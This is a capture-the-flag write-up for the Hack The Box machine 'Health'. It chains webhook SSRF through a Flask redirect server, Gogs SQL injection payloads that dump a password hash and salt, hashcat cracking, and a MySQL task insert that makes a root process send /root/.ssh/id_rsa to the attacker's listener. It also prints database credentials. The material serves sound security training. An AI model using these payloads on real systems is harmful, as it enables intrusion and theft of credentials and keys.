# Health

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.71.152
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 13:13 EDT
Nmap scan report for 10.129.71.152
Host is up (0.029s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
3000/tcp filtered ppp
```

### Webhook

The web application performs 'health checks' for any URL:

<figure><img src="../../../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

For enumeration, I started 2 `nc` listeners, one on port 5555 and the other on port 4444. Then, we can create a webhook like so:

<figure><img src="../../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

When we click test, port 4444 gets a request first.&#x20;

```
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.71.152] 56126
GET / HTTP/1.0
Host: 10.10.14.13:4444
Connection: close
```

When we close port 4444, port 5555 gets a request as well:

{% code overflow="wrap" %}
```
$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.71.152] 58134
POST / HTTP/1.1
Host: 10.10.14.13:5555
Accept: */*
Content-type: application/json
Content-Length: 101

{"webhookUrl":"http:\/\/10.10.14.13:5555","monitoredUrl":"http:\/\/10.10.14.13:4444","health":"down"}
```
{% endcode %}

So the monitored URl is the one that is being checked, and it reports back to port 5555 about the health of the monitored URL. Interestingly, when we try to use `health.htb` as the monitored URL, there's an error saying that we cannot use that host:

<figure><img src="../../../.gitbook/assets/image (32) (3).png" alt=""><figcaption></figcaption></figure>

### Redirect Steal Page

This box was really similar to another box Forge, where we can set up a Python script to redirect applications to make the application visit us and be redirected to another place. The `nmap` scan picked up on port 3000 being filtered earlier, so let's try to view the page contents.

We can create a similar script using Flask and Python:

```python
from flask import Flask,redirect,request

app = Flask(__name__)

@app.route('/redir',methods=["GET"])
def hello():
    return redirect("http://127.0.0.1:3000/")

@app.route("/hook",methods=["POST"])
def hook():
    print(request.json)
    return("", 200)

if __name__ == '__main__':
    app.run(debug=True,host='10.10.14.13', port=80)
```

Using this, we can start the server and create a webhook to always run.

<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

In the next minute, it would visit our `/redir` endpoint and be redirected to port 3000, which would be up, and then return the information to `/hook`. This only works because the application returns the entire page when the health is 'up'.&#x20;

<figure><img src="../../../.gitbook/assets/image (18) (9).png" alt=""><figcaption></figcaption></figure>

### Gogs SQL Injection

Within the output here, we can find the version used:

<figure><img src="../../../.gitbook/assets/image (27) (8).png" alt=""><figcaption></figcaption></figure>

There is one SQL Injection exploit for this:

{% embed url="https://www.exploit-db.com/exploits/35238" %}

This is the Poc used in the exploit:

```
http://www.example.com/api/v1/users/search?q='/**/and/**/false)/**/union/**/
select/**/null,null,@@version,null,null,null,null,null,null,null,null,null,null,
null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from
/**/mysql.db/**/where/**/('%25'%3D'
```

The payload can be simplified to this using numbers instead of `nulls`:

{% code overflow="wrap" %}
```
http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-
```
{% endcode %}

Now, we can test for what type of SQL database this uses by inputting the version and sending the POST request to `/hook`. When using `sqlite_version()`, it appears to work:

{% code overflow="wrap" %}
```
{'webhookUrl': 'http://10.10.14.13/hook', 'monitoredUrl': 'http://10.10.14.13/redir', 'health': 'up', 'body': '{"data":[{"username":"susanne","avatar":"//1.gravatar.com/avatar/c11d48f16f254e918744183ef7b89fce"},{"username":"3","avatar":"//1.gravatar.com/avatar/15"}],"ok":true}', 'message': 'HTTP/1.0 302 FOUND', 'headers': {'Content-Type': 'application/json; charset=UTF-8', 'Content-Length': '166', 'Location': "http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,sqlite_version(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--/**/-", 'Server': 'Werkzeug/2.0.2 Python/3.11.2', 'Date': 'Wed, 10 May 2023 05:57:22 GMT', 'Set-Cookie': '_csrf=; Path=/; Max-Age=0'}}
```
{% endcode %}

We can see that the username of the user is `susanne` and that the version is 3. So we have an SQLite database here. Let's try to dump out the hashes of the user. When searching on what type of hashing algorithm Gogs uses, this is what we find:

{% embed url="https://github.com/kxcode/KrackerGo" %}

Gogs uses PBKDF2 SHA256 hashes, which means it comes with a salt. Next,we can extract the hash using this payload:

{% code overflow="wrap" %}
```
http://127.0.0.1:3000/api/v1/users/search?q=')/**/union/**/all/**/select/**/1,1,(select/**/passwd/**/from/**/user),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1--
```
{% endcode %}

This would return this string:

{% code overflow="wrap" %}
```
username":"66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37"
```
{% endcode %}

We still cannot crack this because we don't have the salt. The salt can be retrieved by using `SELECT salt FROM user`.&#x20;

```
"username":"sO3XIbeW14"
```

With both of these, we can crack the hash. The tool I found earlier doesn't work so well, so let's try to put this into a format for `hashcat`. We can find the right format here:

{% embed url="https://www.reddit.com/r/HowToHack/comments/jdi7l3/using_hashcat_to_crack_a_pbkdf2sha256150000_hash/" %}

Using this, we can first put the detaisl into the right hash format. This would require us to encode the salt and the password with `base64`. Based on the Github Repository I found earlier, it seems that 10000 rounds should be used, so we can use that:

```
$ echo "66c074645545781f1064fb7fd1177453db8f0ca2ce58a9d81c04be2e6d3ba2a0d6c032f0fd4ef83f48d74349ec196f4efe37" | xxd -r -p | base64
ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
$ echo -n 'sO3XIbeW14'| base64
c08zWEliZVcxNA==
Final hash:
sha256:10000:c08zWEliZVcxNA==:ZsB0ZFVFeB8QZPt/0Rd0U9uPDKLOWKnYHAS+Lm07oqDWwDLw/U74P0jXQ0nsGW9O/jc=
```

When we run `hashcat` on my main machine, we can see that it cracks to give `february15`.&#x20;

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Using this, we can `ssh` in as `susanne`.

<figure><img src="../../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Root LFI

We can read the `/var/www/html` files for the website that is hosted. Within the `.env` file present, we can find some database credentials:

```
DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=laravel
DB_USERNAME=laravel
DB_PASSWORD=MYsql_strongestpass@2014+
```

Other than SQL credentials, there were no other suspicious binaries or programs within the machine. In this case, we can run `pspy64` to enumerate the possible processes. Here are the interesting ones running as `root`.&#x20;

```
2023/05/10 06:26:01 CMD: UID=0    PID=19534  | php artisan schedule:run 
2023/05/10 06:26:02 CMD: UID=0    PID=19537  | grep columns 
2023/05/10 06:26:02 CMD: UID=0    PID=19535  | sh -c stty -a | grep columns 
2023/05/10 06:26:02 CMD: UID=0    PID=19538  | 
2023/05/10 06:26:06 CMD: UID=0    PID=19542  | mysql laravel --execute TRUNCATE tasks
```

`artisan` is used to run some scheduled tasks, and the `mysql` database is used somehow. We can login to the database using the credentials above.&#x20;

<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Within the `laravel` database, therei s a `tasks` table that is empty:

```
mysql> show tables;
+------------------------+
| Tables_in_laravel      |
+------------------------+
| failed_jobs            |
| migrations             |
| password_resets        |
| personal_access_tokens |
| tasks                  |
| users                  |
+------------------------+
6 rows in set (0.00 sec)

mysql> select * from tasks\g
Empty set (0.00 sec)
```

Since this was running stuff using `artisan`, we can try to find the file that executes the code. Within in the `/var/www/html/app/Console/kernel.php` file, I found the code that runs the Scheduler:

```php
class Kernel extends ConsoleKernel
{

    protected function schedule(Schedule $schedule)
    {

        /* Get all tasks from the database */
        $tasks = Task::all();

        foreach ($tasks as $task) {

            $frequency = $task->frequency;

            $schedule->call(function () use ($task) {
                /*  Run your task here */
                HealthChecker::check($task->webhookUrl, $task->monitoredUrl, $task->onlyError);
                Log::info($task->id . ' ' . \Carbon\Carbon::now());
            })->cron($frequency);
        }
<TRUNCATED>
```

It appears that the tasks refer to the webhook URLs that we create on the website. I created one just to test, and it shows up.

```
mysql> select * from tasks\g
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+
| id                                   | webhookUrl              | onlyError | monitoredUrl             | frequency | created_at          | updated_at          |
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+
| ff03ab78-f23a-4372-8484-74ed4f1d8ab2 | http://10.10.14.13/hook |         0 | http://10.10.14.13/redir | * * * * * | 2023-05-10 06:35:54 | 2023-05-10 06:35:54 |
+--------------------------------------+-------------------------+-----------+--------------------------+-----------+---------------------+---------------------+
```

Since this kind of task was running as `root`, we can reuse our redirect script and change the monitoredUrl to something like `/root/.ssh/id_rsa` instead.&#x20;

Then, we can send the output to our `/hook` endpoint.

{% code overflow="wrap" %}
```
mysql> insert into tasks (id,webhookUrl, onlyError, monitoredUrl, frequency, created_at, updated_at) values ('ff03ab78-f23a-4372-8484-74ed4f1d8ab2', 'http://10.10.14.13/hook', '0', '/root/.ssh/id_rsa', '* * * * *', '2023-05-10 06:35:54', '2023-05-10 06:35:54');
```
{% endcode %}

After waiting for a bit, we would get a callback on our redirect script with the private key:

<figure><img src="../../../.gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

Then, we can just `ssh` into `root`.

<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
